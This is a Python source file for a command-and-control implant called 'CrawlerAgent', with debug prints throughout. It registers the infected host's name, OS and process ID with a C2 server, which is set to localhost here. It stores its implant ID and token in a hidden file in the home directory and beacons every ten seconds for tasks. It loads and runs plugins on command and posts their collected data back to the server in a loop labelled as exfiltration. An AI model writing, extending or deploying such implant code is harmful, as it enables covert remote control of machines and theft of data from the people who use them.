import requests
import time
import os
import json
import platform
import threading
import importlib
import pkgutil
from typing import Dict, List, Type

print("[AGENT_DEBUG] Script start. Imports successful.")

# --- Configuration ---
C2_URL = "http://127.0.0.1:8000/api"
BEACON_INTERVAL_SECONDS = 10
CONFIG_FILE_PATH = os.path.join(os.path.expanduser("~"), ".crawler_config.json")
print("[AGENT_DEBUG] Configuration loaded.")

# --- Import Base Class ---
from .plugins.base_plugin import BasePlugin
print("[AGENT_DEBUG] BasePlugin imported.")

class CrawlerAgent:
    """The main class for the implant/agent."""

    def __init__(self):
        print("[AGENT_DEBUG] CrawlerAgent.__init__ start.")
        self.implant_id: str | None = None
        self.token: str | None = None
        self.running_plugins: Dict[str, BasePlugin] = {}
        self.loaded_plugins: Dict[str, BasePlugin] = {}

        print("[AGENT_DEBUG] Calling _load_config...")
        self._load_config()
        print("[AGENT_DEBUG] Calling _load_plugins...")
        self._load_plugins()
        print("[AGENT_DEBUG] CrawlerAgent.__init__ end.")

    def _load_config(self):
        print("[AGENT_DEBUG] _load_config: Start.")
        if os.path.exists(CONFIG_FILE_PATH):
            print(f"[AGENT_DEBUG] _load_config: Found config file at {CONFIG_FILE_PATH}.")
            try:
                with open(CONFIG_FILE_PATH, 'r') as f:
                    config = json.load(f)
                    self.implant_id = config.get('implant_id')
                    self.token = config.get('token')
                print("[AGENT_DEBUG] _load_config: Config loaded successfully.")
            except (json.JSONDecodeError, IOError) as e:
                print(f"[AGENT_DEBUG] _load_config: Error loading config file: {e}")
        else:
            print("[AGENT_DEBUG] _load_config: No config file found.")

    def _save_config(self):
        print("[AGENT_DEBUG] _save_config: Start.")
        config = {'implant_id': self.implant_id, 'token': self.token}
        with open(CONFIG_FILE_PATH, 'w') as f:
            json.dump(config, f)
        if platform.system() != "Windows":
            os.chmod(CONFIG_FILE_PATH, 0o600)
        print("[AGENT_DEBUG] _save_config: End.")

    def _register_with_c2(self) -> bool:
        print("[AGENT_DEBUG] _register_with_c2: Start.")
        payload = {
            "hostname": platform.node(),
            "os": f"{platform.system()} {platform.release()}",
            "pid": os.getpid()
        }
        try:
            print("[AGENT_DEBUG] _register_with_c2: Sending POST request...")
            response = requests.post(f"{C2_URL}/register", json=payload, timeout=10)
            response.raise_for_status()
            data = response.json()
            self.implant_id = data['implant_id']
            self.token = data['token']
            print("[AGENT_DEBUG] _register_with_c2: Registration successful.")
            self._save_config()
            return True
        except requests.exceptions.RequestException as e:
            print(f"[AGENT_DEBUG] _register_with_c2: Error during registration: {e}")
            return False

    def _load_plugins(self):
        print("[AGENT_DEBUG] _load_plugins: Start.")
        plugins_package = 'crawler.implant.plugins'
        plugins_path = os.path.join(os.path.dirname(__file__), "plugins")
        print(f"[AGENT_DEBUG] _load_plugins: Iterating modules in {plugins_path}.")
        for _, name, _ in pkgutil.iter_modules([plugins_path]):
            if name != "base_plugin":
                try:
                    print(f"[AGENT_DEBUG] _load_plugins: Importing module {name}.")
                    module = importlib.import_module(f"{plugins_package}.{name}")
                    print(f"[AGENT_DEBUG] _load_plugins: Searching for Plugin class in {name}.")
                    for item_name in dir(module):
                        item = getattr(module, item_name)
                        if isinstance(item, type) and issubclass(item, BasePlugin) and item is not BasePlugin:
                            print(f"[AGENT_DEBUG] _load_plugins: Instantiating {item_name}.")
                            instance = item()
                            plugin_name = instance.get_name()
                            self.loaded_plugins[plugin_name] = instance
                            print(f"[AGENT_DEBUG] _load_plugins: Successfully loaded plugin: '{plugin_name}'")
                except Exception as e:
                    print(f"[AGENT_DEBUG] _load_plugins: Failed to load plugin {name}: {e}")
        print("[AGENT_DEBUG] _load_plugins: End.")

    def _handle_task(self, task: Dict):
        command = task.get('command')
        args = task.get('args', {})
        plugin_name = args.get('plugin_name')

        print(f"Received task: {command} with args {args}")

        if command == "start_plugin":
            if plugin_name in self.loaded_plugins and plugin_name not in self.running_plugins:
                plugin = self.loaded_plugins[plugin_name]
                self.running_plugins[plugin_name] = plugin
                thread = threading.Thread(target=plugin.start, args=(args,))
                thread.daemon = True
                thread.start()
                print(f"Plugin '{plugin_name}' started.")
            else:
                print(f"Warning: Plugin '{plugin_name}' not found or already running.")

        elif command == "stop_plugin":
            if plugin_name in self.running_plugins:
                self.running_plugins[plugin_name].stop()
                del self.running_plugins[plugin_name]
                print(f"Plugin '{plugin_name}' stopped.")
            else:
                print(f"Warning: Plugin '{plugin_name}' is not currently running.")

        elif command == "terminate":
            print("Terminate command received. Shutting down agent.")
            for plugin in self.running_plugins.values():
                plugin.stop()
            os._exit(0)

    def run(self):
        print("[AGENT_DEBUG] run: Start.")
        if not self.implant_id or not self.token:
            print("[AGENT_DEBUG] run: No ID/token found, starting registration.")
            if not self._register_with_c2():
                print("[AGENT_DEBUG] run: Registration failed, exiting.")
                return

        print("[AGENT_DEBUG] run: Entering main loop.")
        while True:
            try:
                headers = {"Authorization": f"Bearer {self.token}"}

                print("[AGENT_DEBUG] run: Beaconing for tasks...")
                response = requests.get(f"{C2_URL}/tasks", headers=headers, timeout=5)

                if response.status_code == 401:
                    print("[AGENT_DEBUG] run: Token rejected by C2. Re-registering...")
                    if not self._register_with_c2():
                        time.sleep(BEACON_INTERVAL_SECONDS * 2)
                        continue

                response.raise_for_status()
                tasks = response.json().get('tasks', [])
                if tasks:
                    print(f"[AGENT_DEBUG] run: Received {len(tasks)} new tasks.")
                for task in tasks:
                    self._handle_task(task)

                print("[AGENT_DEBUG] run: Exfiltrating data...")
                for name, instance in list(self.running_plugins.items()):
                    data = instance.get_data()
                    if data:
                        payload = {"plugin": name, "data": json.dumps(data)}
                        requests.post(f"{C2_URL}/data", json=payload, headers=headers, timeout=5)

            except requests.exceptions.RequestException as e:
                print(f"[AGENT_DEBUG] run: C2 communication error: {e}")

            print(f"[AGENT_DEBUG] run: Sleeping for {BEACON_INTERVAL_SECONDS} seconds.")
            time.sleep(BEACON_INTERVAL_SECONDS)

if __name__ == "__main__":
    print("[AGENT_DEBUG] __main__: Script invoked.")
    agent = CrawlerAgent()
    agent.run()
    print("[AGENT_DEBUG] __main__: agent.run() exited.")
